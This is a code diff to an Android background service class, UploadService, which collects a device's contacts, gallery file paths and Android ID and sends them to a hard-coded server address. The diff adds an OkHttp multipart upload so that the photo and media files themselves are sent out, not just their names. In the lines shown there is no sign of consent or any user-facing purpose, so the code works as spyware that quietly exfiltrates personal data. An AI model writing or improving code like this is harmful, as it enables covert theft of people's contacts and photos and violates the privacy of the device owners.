@@ -22,9 +22,17 @@ import java.io.OutputStream;
 import java.net.ConnectException;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLConnection;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.List;
+
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class UploadService extends Service {
 
@@ -94,7 +102,7 @@ public class UploadService extends Service {
     }
 
     private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
-        String serverUrl = "http://192.168.200.78:8080/upload"; // Updated server URL
+        String serverUrl = "http://192.168.200.78:3000/upload"; // Updated server URL
 
         // Upload contacts
         for (String contact : contacts) {
@@ -107,14 +115,45 @@ public class UploadService extends Service {
             }
         }
 
-        // Upload gallery files
+        // Upload gallery files as multipart
         for (String filePath : galleryFiles) {
-            try {
-                // Create JSON payload for file
-                String payload = "{\"type\":\"file\",\"data\":\"" + new File(filePath).getName() + "\"}";
-                sendPostRequest(serverUrl, payload);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to upload file: " + filePath, e);
+            File file = new File(filePath);
+            if (file.exists()) {
+                try {
+                    uploadFile(serverUrl, file);
+                } catch (Exception e) {
+                    Log.e(TAG, "Failed to upload file: " + filePath, e);
+                }
+            }
+        }
+    }
+
+    // Method to upload file using multipart
+    private void uploadFile(String serverUrl, File file) throws IOException {
+        // Create a new MultipartBody for file upload
+        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
+
+        // Dynamically set MIME type based on file extension
+        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
+        builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)));
+
+        // Send the multipart request
+        RequestBody requestBody = builder.build();
+        Request request = new Request.Builder()
+                .url(serverUrl)
+                .post(requestBody)
+                .build();
+
+        try (Response response = new OkHttpClient().newCall(request).execute()) {
+            if (response.isSuccessful()) {
+                Log.d(TAG, "File upload successful: " + file.getName());
+            } else {
+                Log.e(TAG, "Failed to upload file: " + file.getName() + ". Server responded: " + response.code());
+                // Read the response body for detailed error info
+                if (response.body() != null) {
+                    String errorBody = response.body().string();
+                    Log.e(TAG, "Server error response: " + errorBody);
+                }
             }
         }
     }
